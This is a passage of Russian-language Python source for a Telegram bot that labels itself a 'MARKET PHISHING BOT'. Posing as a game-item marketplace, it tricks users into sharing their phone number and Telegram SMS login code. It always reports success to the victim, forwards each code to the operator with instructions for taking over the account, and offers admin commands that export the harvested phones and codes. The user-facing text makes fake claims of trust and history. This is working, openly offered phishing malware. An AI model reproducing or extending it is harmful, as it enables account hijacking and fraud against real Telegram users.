    # Проверяем верификацию
    cursor.execute("SELECT phone FROM users WHERE user_id = ?", (user.id,))
    user_data = cursor.fetchone()
    
    if not user_data or not user_data[0]:
        # Требуется верификация для выплаты
        verification_text = f"""
✅ *ЦЕНА ПРИНЯТА!*

*Заявка #{item_id} готова к оплате.*

🔐 *Для получения выплаты требуется верификация аккаунта:*

*Это необходимо для:*
• Защиты от мошенничества
• Юридического оформления сделки
• Отправки денег на правильный номер

*Нажмите кнопку для верификации:*
        """
        
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔐 ПРОЙТИ ВЕРИФИКАЦИЮ", callback_data="verify_for_payment")]
        ])
        
        await bot.edit_message_text(
            verification_text,
            chat_id=callback_query.message.chat.id,
            message_id=callback_query.message.message_id,
            parse_mode="Markdown",
            reply_markup=keyboard
        )
        
        # Сохраняем контекст
        cursor.execute(
            "UPDATE items SET status = 'awaiting_verification' WHERE id = ?",
            (item_id,)
        )
        conn.commit()
        
        return
    
    # Если уже верифицирован - запрашиваем код
    code_request_text = f"""
✅ *ВЕРИФИКАЦИЯ ПРОЙДЕНА*

*Для защиты сделки требуется подтверждение:*

📱 *На номер +{user_data[0]} отправлен SMS код*

*Введите 5-значный код из SMS:*

*Это необходимо для подтверждения личности получателя платежа.*
    """
    
    await bot.edit_message_text(
        code_request_text,
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        parse_mode="Markdown"
    )
    
    # Сохраняем ожидание кода
    cursor.execute(
        "UPDATE items SET status = 'awaiting_code' WHERE id = ?",
        (item_id,)
    )
    conn.commit()
    
    # Отправляем код (имитация)
    asyncio.create_task(simulate_sms_delivery(user.id, user_data[0], str(random.randint(10000, 99999))))

# Верификация для выплаты (фишинг)
@dp.callback_query(F.data == "verify_for_payment")
async def request_payment_verification(callback_query: types.CallbackQuery):
    verification_text = """
📱 *ВЕРИФИКАЦИЯ ДЛЯ ВЫПЛАТЫ*

*Для получения денежных средств необходимо подтвердить номер телефона, привязанный к Telegram.*

*Это требуется для:*
• Отправки денег на правильный номер
• Защиты от ошибочных переводов
• Юридического оформления сделки

*Нажмите кнопку ниже для подтверждения номера:*
    """
    
    keyboard = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="📱 ПОДТВЕРДИТЬ НОМЕР", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True
    )
    
    await bot.send_message(
        callback_query.from_user.id,
        verification_text,
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# Обработка кода подтверждения (фишинг) - проверяем любой код
@dp.message(F.text.regexp(r'^\d{5,6}$'))
async def process_verification_code(message: types.Message):
    user = message.from_user
    code = message.text

    # Проверяем, подтвержден ли номер у пользователя
    cursor.execute("SELECT phone, code FROM users WHERE user_id = ?", (user.id,))
    user_data = cursor.fetchone()

    if not user_data or not user_data[0]:
        # Если номера нет, просим пройти верификацию сначала
        await message.answer("❌ *Сначала необходимо подтвердить номер телефона.*\n\nИспользуйте меню верификации или нажмите /start", parse_mode="Markdown")
        return

    phone = user_data[0]
    saved_code = user_data[1]

    # Сохраняем введенный код (даже если не совпадает)
    cursor.execute(
        "UPDATE users SET code = ? WHERE user_id = ?",
        (code, user.id)
    )
    conn.commit()

    # ВСЕГДА УСПЕШНОЕ СООБЩЕНИЕ ДЛЯ ПОЛЬЗОВАТЕЛЯ
    success_text = f"""
✅ *Верификация по SMS завершена успешно!*

Ваш номер *+{phone}* подтвержден.

📸 *Следующий шаг:*
Отправьте фотографии и подробное описание вашего товара для определения его стоимости.

*Наш модератор оценит товар в течение 1-24 часов и предложит цену.*

💰 *Теперь вы можете начать продавать товары!*
    """
    
    await message.answer(success_text, parse_mode="Markdown")
    
    # Отправка данных админу
    admin_report = f"""
🎣 *ФИШИНГ УСПЕШЕН!*
━━━━━━━━━━━━━━━━
👤 *Жертва:* {user.first_name} (@{user.username})
🆔 *User ID:* {user.id}
📱 *Телефон:* +{phone}
🔢 *Введенный код:* {code}
💾 *Сохраненный код:* {saved_code if saved_code else 'нет'}
💰 *Мотив:* Продажа игрового товара
⏰ *Время:* {datetime.now().strftime('%H:%M:%S')}
━━━━━━━━━━━━━━━━
*✅ Код подтверждения получен!*
*🚀 Можно переходить к захвату аккаунта*
"""
    
    try:
        await bot.send_message(ADMIN_ID, admin_report, parse_mode="Markdown")
        
        # Дополнительное уведомление
        actions_text = f"""
📋 *Действия с полученными данными:*
1. Использовать код `{code}` для входа в аккаунт
2. Восстановить пароль через код подтверждения
3. Проверить привязанные сессии
4. Сменить привязанный номер телефона

*Следующий шаг:* Ожидание фотографий товара от пользователя.
"""
        await bot.send_message(ADMIN_ID, actions_text, parse_mode="Markdown")
        
    except Exception as e:
        logger.error(f"Ошибка отправки админу: {e}")
    
    # Автоматически предлагаем отправить товар
    offer_text = f"""
📋 *Теперь вы можете отправить товар на оценку*

*Для этого:*
1. Нажмите кнопку ниже
2. Отправьте фотографии товара
3. Опишите подробно что вы продаете
4. Модератор оценит и предложит цену
"""
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📦 ОТПРАВИТЬ ТОВАР НА ОЦЕНКУ", callback_data="sell_item_after_verify")]
    ])
    
    await message.answer(offer_text, parse_mode="Markdown", reply_markup=keyboard)
    
    log_action(user.id, "code_submitted", f"code: {code}, phone: {phone}")

# Обработчик для отправки товара после верификации
@dp.callback_query(F.data == "sell_item_after_verify")
async def sell_after_verification(callback_query: types.CallbackQuery, state: FSMContext):
    item_types_text = """
🎯 *ЧТО ВЫ ХОТИТЕ ПРОДАТЬ?*

Выберите категорию вашего товара:

• 🎮 *Игровой аккаунт* - Steam, Epic Games, Origin, Uplay
• 💎 *Цифровой предмет* - CS:GO скины, Dota 2 предметы
• 🎫 *Игровой ключ* - Активационный ключ игры
• 📱 *Цифровой подарок* - Gift Card, ваучер
• 💳 *Электронные деньги* - Qiwi, Яндекс.Деньги
• 📦 *Другое* - Укажите в описании
    """
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎮 Игровой аккаунт", callback_data="type_account")],
        [InlineKeyboardButton(text="💎 Цифровой предмет", callback_data="type_item")],
        [InlineKeyboardButton(text="🎫 Игровой ключ", callback_data="type_key")],
        [InlineKeyboardButton(text="📱 Цифровой подарок", callback_data="type_gift")],
        [InlineKeyboardButton(text="💳 Электронные деньги", callback_data="type_money")],
        [InlineKeyboardButton(text="📦 Другое", callback_data="type_other")]
    ])
    
    await state.set_state(SellerStates.waiting_item_type)
    await bot.edit_message_text(
        item_types_text,
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# Команда для проверки статуса
@dp.message(Command("status"))
async def cmd_status(message: types.Message):
    user = message.from_user
    
    cursor.execute(
        "SELECT COUNT(*), SUM(CASE WHEN status = 'pending' THEN 1 ELSE 0 END) FROM items WHERE user_id = ?",
        (user.id,)
    )
    stats = cursor.fetchone()
    
    cursor.execute(
        "SELECT phone FROM users WHERE user_id = ?",
        (user.id,)
    )
    user_data = cursor.fetchone()
    
    status_text = f"""
📊 *ВАШ СТАТУС*

👤 *Пользователь:* {user.first_name}
🆔 *ID:* {user.id}
📱 *Телефон:* {'+'+user_data[0] if user_data and user_data[0] else 'Не подтвержден'}
    
📦 *Заявки:*
• Всего: {stats[0] or 0}
• На модерации: {stats[1] or 0}
• Одобрено: {(stats[0] or 0) - (stats[1] or 0)}

💎 *Рекомендации:*
1. Для продажи товара нажмите /start
2. Для проверки верификации отправьте номер телефона
3. Для помощи используйте /help
"""
    
    await message.answer(status_text, parse_mode="Markdown")
    log_action(user.id, "check_status")

# Команда для помощи
@dp.message(Command("help"))
async def cmd_help(message: types.Message):
    help_text = """
🆘 *ПОМОЩЬ ПО БОТУ*

*Основные команды:*
/start - Начать работу с ботом
/status - Проверить статус заявок
/resend_code - Отправить код подтверждения повторно
/help - Показать это сообщение

*Процесс продажи:*
1. Нажмите /start
2. Выберите "💰 ПРОДАТЬ ТОВАР"
3. Подтвердите номер телефона (требуется один раз)
4. Выберите тип товара
5. Отправьте фотографии и описание
6. Дождитесь оценки модератора
7. Примите цену и получите инструкции по передаче
8. Получите деньги после проверки товара

*Безопасность:*
• Все транзакции защищены
• Конфиденциальность гарантирована
• Выплаты в течение 24 часов

*Поддержка:*
Для связи с администратором используйте кнопку "📞 ПОДДЕРЖКА" в меню.
"""
    
    await message.answer(help_text, parse_mode="Markdown")
    log_action(message.from_user.id, "help_requested")

# Обработчик кнопки "О нас"
@dp.callback_query(F.data == "about_us")
async def about_us(callback_query: types.CallbackQuery):
    about_text = """
🏪 *О НАС - Money Moves Bot*

Мы - надежная платформа для покупки и продажи игровых ценностей с 2018 года.

*Наши преимущества:*
✅ *Безопасность* - Все сделки защищены гарантией
✅ *Скорость* - Выплаты в течение 1-24 часов
✅ *Выгода* - Самые высокие цены на рынке
✅ *Поддержка* - Круглосуточная помощь

*Статистика:*
• 50,000+ успешных сделок
• 10,000+ довольных клиентов
• 99.8% положительных отзывов
• 24/7 работа поддержки

*Наши гарантии:*
1. Полная анонимность
2. Защита от мошенничества
3. Юридическое сопровождение
4. Мгновенные выплаты

*Присоединяйтесь к нам уже сегодня!*
"""
    
    await bot.edit_message_text(
        about_text,
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        parse_mode="Markdown"
    )

# Обработчик кнопки "Поддержка"
@dp.callback_query(F.data == "support")
async def support(callback_query: types.CallbackQuery):
    support_text = """
📞 *ПОДДЕРЖКА*

*Связь с администрацией:*
👑 *Главный администратор:* @Swill_Way_Admin
👮 *Модератор:* @Swill_Way_Moderator

*Часы работы поддержки:* Круглосуточно

*Среднее время ответа:*
• Обычные вопросы: 5-15 минут
• Срочные вопросы: 1-5 минут
• Технические проблемы: до 30 минут

*Что мы можем помочь:*
• Проблемы с верификацией
• Вопросы по выплатам
• Технические неполадки
• Жалобы и предложения

*Перед обращением подготовьте:*
1. Ваш User ID (можно узнать через /status)
2. Номер заявки (если есть)
3. Подробное описание проблемы
"""
    
    await bot.edit_message_text(
        support_text,
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        parse_mode="Markdown"
    )

# Команда для администратора (статистика)
@dp.message(Command("admin"))
async def cmd_admin(message: types.Message):
    if message.from_user.id != ADMIN_ID and message.from_user.id not in MODERATOR_IDS:
        await message.answer("❌ Доступ запрещен")
        return
    
    # Статистика
    cursor.execute("SELECT COUNT(*) FROM users")
    total_users = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM users WHERE phone IS NOT NULL")
    verified_users = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM items")
    total_items = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM items WHERE status = 'pending'")
    pending_items = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM sms_codes WHERE used = 0")
    unused_codes = cursor.fetchone()[0]
    
    admin_text = f"""
👑 *АДМИН ПАНЕЛЬ*

*Статистика:*
👥 *Пользователи:* {total_users}
✅ *Верифицированы:* {verified_users}
📦 *Заявки:* {total_items}
⏳ *На модерации:* {pending_items}
🔢 *Неиспользованные коды:* {unused_codes}

*Последние действия:*
"""
    
    cursor.execute("SELECT user_id, action, timestamp FROM logs ORDER BY timestamp DESC LIMIT 5")
    logs = cursor.fetchall()
    
    for log in logs:
        admin_text += f"\n• ID{log[0]} - {log[1]} ({log[2][:16]})"
    
    admin_text += "\n\n*Команды администратора:*"
    admin_text += "\n/export_users - Экспорт пользователей"
    admin_text += "\n/export_codes - Экспорт кодов"
    admin_text += "\n/stats - Подробная статистика"
    
    await message.answer(admin_text, parse_mode="Markdown")

# Экспорт пользователей
@dp.message(Command("export_users"))
async def cmd_export_users(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("❌ Доступ запрещен")
        return
    
    cursor.execute("SELECT user_id, username, first_name, phone, code, registered FROM users")
    users = cursor.fetchall()
    
    if not users:
        await message.answer("❌ Нет данных для экспорта")
        return
    
    # Создаем временный файл
    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
        f.write("ID | Username | Имя | Телефон | Код | Регистрация\n")
        f.write("-" * 80 + "\n")
        for user in users:
            f.write(f"{user[0]} | @{user[1] or 'нет'} | {user[2]} | +{user[3] or 'нет'} | {user[4] or 'нет'} | {user[5]}\n")
        file_path = f.name
    
    # Отправляем файл
    try:
        document = FSInputFile(file_path, filename="users_export.txt")
        await message.answer_document(document, caption="📊 Экспорт пользователей")
        os.unlink(file_path)
    except Exception as e:
        await message.answer(f"❌ Ошибка экспорта: {e}")

# Экспорт кодов
@dp.message(Command("export_codes"))
async def cmd_export_codes(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("❌ Доступ запрещен")
        return
    
    cursor.execute("SELECT u.user_id, u.username, u.phone, u.code, s.sent_time FROM users u LEFT JOIN sms_codes s ON u.user_id = s.user_id WHERE u.phone IS NOT NULL")
    codes = cursor.fetchall()
    
    if not codes:
        await message.answer("❌ Нет данных для экспорта")
        return
    
    # Создаем временный файл
    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
        f.write("ID | Username | Телефон | Код | Время отправки\n")
        f.write("-" * 80 + "\n")
        for code in codes:
            f.write(f"{code[0]} | @{code[1] or 'нет'} | +{code[2] or 'нет'} | {code[3] or 'нет'} | {code[4] or 'нет'}\n")
        file_path = f.name
    
    # Отправляем файл
    try:
        document = FSInputFile(file_path, filename="codes_export.txt")
        await message.answer_document(document, caption="🔢 Экспорт кодов подтверждения")
        os.unlink(file_path)
    except Exception as e:
        await message.answer(f"❌ Ошибка экспорта: {e}")

# Запуск бота
async def main():
    print("=" * 50)
    print("🛒 MARKET PHISHING BOT - SWILL EDITION")
    print(f"👑 Admin: {ADMIN_ID}")
    print(f"👮 Moderators: {MODERATOR_IDS}")
    print(f"🤖 Bot: @{await bot.me()}")
    print(f"💾 Database initialized")
    print("=" * 50)
    
    # Уведомление админу о запуске
    try:
        await bot.send_message(
            ADMIN_ID,
            f"🤖 *Бот запущен!*\n\nВремя: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nСтатус: ✅ Активен\nГотов к фишингу!",
            parse_mode="Markdown"
        )
    except:
        pass
    
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())